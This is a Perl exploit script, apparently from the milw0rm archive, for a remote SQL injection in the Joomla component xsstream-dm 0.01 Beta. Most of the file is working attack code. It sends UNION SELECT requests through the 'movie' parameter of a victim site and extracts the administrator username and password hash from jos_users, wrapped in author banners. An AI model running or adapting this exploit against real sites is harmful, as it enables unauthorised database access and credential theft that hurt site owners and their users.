#!/usr/bin/perl -w

#########################################################
#     Joomla Component xsstream-dm 0.01 Beta Remote SQL Injection	#
#########################################################

########################################
#[*] Founded by : Houssamix From H-T Team 
#[*] H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo
#[*] Contact: Ev!L
#[*] Greetz : CoNaN & HaCkeR_EgY & All friends & All muslims HaCkeRs  :) 
########################################

#[*] Script_Name: "Joomla"
#[*] Component_Name: "xsstream-dm" 0.01 Beta


########################################



print "\t\t########################################################\n\n";
print "\t\t#                        Viva Islam                    #\n\n";
print "\t\t########################################################\n\n";
print "\t\t# Joomla Component (xsstream-dm) Remote SQL Injection  #\n\n";
print "\t\t#           by Houssamix & Stack-Terrorist             #\n\n";
print "\t\t#              from H-T Team & v4 Team                 #\n\n";
print "\t\t########################################################\n\n";

use LWP::UserAgent;
die "Example: perl $0 http://victim.com/\n" unless @ARGV;
#the username of joomla 
$user="username";
#the pasword of joomla 
$pass="password";
#the tables of joomla 
$tab="jos_users";
#the the union of joomla 
$un="/**/union/**/select/**/";
#the vulnerable compenent  
$com="com_xsstream-dm&Itemid";
# Lets star exploiting 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . "/index.php?option=".$com."=69&movie=-1".$un."1,2,".$user.",4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/".$tab."/**";

$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;

if ($answer =~ /<div class="contentpagetitle">(.*?)<\/div>/){
        
        print "\n[+] Admin User : $1";
}
$host2 = $ARGV[0] . "/index.php?option=".$com."=69&movie=-1".$un."1,2,".$pass.",4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/".$tab."/**";

$res2 = $b->request(HTTP::Request->new(GET=>$host2));
$answer = $res2->content;

if ($answer =~/([0-9a-fA-F]{32})/){print "\n[+] Admin Hash : $1\n\n";
print "\t\t#   Exploit has ben aported user and password hash   #\n\n";
}

else{print "\n[-] Exploit Failed...\n";}



#exploit discovered by Houssamix From H-T Team
# exploit exploited by Stack-Terrorist 

# milw0rm.com [2008-05-11]
